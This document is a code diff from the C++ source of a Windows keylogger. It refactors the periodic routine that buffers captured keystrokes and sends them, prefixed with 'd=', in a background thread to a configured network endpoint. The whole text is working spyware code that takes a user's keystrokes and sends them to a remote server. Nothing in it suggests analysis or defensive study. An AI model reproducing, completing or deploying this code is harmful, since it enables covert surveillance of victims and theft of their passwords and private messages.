@@ -45,14 +45,16 @@ void Keylogger::Run()
 {
 	DWORD ticksLast = GetTickCount();
 
+	keysPressed.assign(L"d=");
+
 	for (;;)
 	{
 		Sleep(V_IDLE_TIME);
 
 		if (GetTickCount() - ticksLast >= this->sendInterval)
 		{
-			this->SendNewThread(&keysPressed);
-			keysPressed.clear();
+			this->SendNewThread(keysPressed);
+			keysPressed.assign(L"d=");
 
 			if (this->shouldStop)
 				break;
@@ -103,25 +105,22 @@ typedef struct {
 DWORD WINAPI ProcSend(LPVOID lpParameter)
 {
 	ProcSend_Data *data = (ProcSend_Data*) lpParameter;
-	data->keylogger->Send(&data->keys);
+	data->keylogger->Send(data->keys);
 	delete data;
 	return 0;
 }
 
-void Keylogger::SendNewThread(const std::wstring *keys)
+void Keylogger::SendNewThread(const std::wstring& keys)
 {
-	ProcSend_Data *data = new ProcSend_Data{this, std::wstring(*keys)};
+	ProcSend_Data *data = new ProcSend_Data{ this, std::wstring(keys) };
 
 	CreateThread(0, 0xFFFF, ProcSend, data, 0, 0);
 }
-void Keylogger::Send(const std::wstring *keys)
+void Keylogger::Send(const std::wstring& keys)
 {
-	std::wstring msgText = L"d=";
-	msgText.append(*keys);
-	
 	size_t resp_len;
 	wchar_t *resp;
-	bool ret = network.SendAndGetTextW(V_NET_FILE_DATA, msgText.c_str(), &resp_len, &resp);
+	bool ret = network.SendAndGetTextW(V_NET_FILE_DATA, keys.c_str(), &resp_len, &resp);
 
 	if (ret && resp_len > 0)
 	{
